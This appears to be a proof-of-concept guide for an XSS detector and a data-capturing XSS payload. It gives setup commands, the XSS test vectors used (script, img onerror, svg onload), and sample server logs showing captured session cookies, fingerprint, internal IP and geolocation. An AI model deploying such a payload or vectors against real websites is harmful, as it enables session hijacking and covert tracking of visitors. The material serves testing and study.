Proof of Concept (PoC) Guide
Step 1: Setting Up the Environment

Clone the Repository:

    git clone <repository-url>
    cd xss-poc

Install Dependencies:

    npm install express body-parser

Configure the Host:

    Open server.js, xss_payload.html, and xss_detector.html in a text editor.
    Change the host variable to your own website or IP address.

Example:

    const host = 'your-website.com'; // Change this to your own website

Step 2: Running the Server

Start the Server:

    node server.js

You should see a message indicating that the server is running:

    Server running at http://your-website.com:3000

Step 3: Using the XSS Detector

    Open the XSS Detector:
        Open xss_detector.html in a web browser.

    Enter the URL to Test:
        In the input field, enter the URL of the website you want to test for XSS vulnerabilities.
        Click the "Test for XSS" button.

    Observe the Results:
        The script will test the URL with various XSS vectors and display the results on the page.
        If a potential XSS vulnerability is found, it will be indicated in the results.

Step 4: Using the XSS Payload

 Open the XSS Payload:
        Open xss_payload.html in a web browser.

 Interact with the Form:
        Fill out the login form with some sample data.
        Observe the browser's console and the server's terminal for captured data.

 Analyze the Captured Data:
        The payload will capture various types of data, including user agent, screen resolution, plugins, cookies, and more.
        This data will be sent to the server and logged in the terminal.

Example Outputs
Server Terminal Output

When you interact with the form in xss_payload.html, you should see output in the server terminal similar to this:

    Captured Headers: {
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      'content-type': 'application/json',
      'accept': '*/*',
      'origin': 'http://your-website.com:3000',
      'referer': 'http://your-website.com:3000/xss_payload.html',
      'accept-encoding': 'gzip, deflate',
      'accept-language': 'en-US,en;q=0.9',
      'connection': 'close'
    }
    POST Body: {
      t: 'input',
      v: 'testuser',
      fp: {
    ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    lang: 'en-US',
    screen: '1920x1080',
    plugins: ['Chrome PDF Viewer', 'Shockwave Flash', ...],
    cookies: 'sessionid=abc123; csrftoken=xyz456'
      },
      ts: '2023-10-01T12:34:56.789Z',
      canvasFingerprint: 'data:image/png;base64,...',
      internalIP: '192.168.1.1',
      location: { latitude: 40.7128, longitude: -74.0060 }
    }

XSS Detector Results

When you test a URL with xss_detector.html, you should see results similar to this:

    Testing for XSS vulnerabilities...
    Potential XSS vulnerability found with vector: <script>alert("XSS")</script>
    No XSS vulnerability found with vector: <img src="x" onerror="alert('XSS')">
    Potential XSS vulnerability found with vector: <svg/onload=alert("XSS")>
    No XSS vulnerability found with vector: <body onload=alert("XSS")>
    ...

Conclusion

This PoC demonstrates how to set up and use the XSS detection and payload scripts. By following the steps outlined above, you can test for XSS vulnerabilities and analyze the captured data. Always ensure you have permission to test for vulnerabilities on a website.
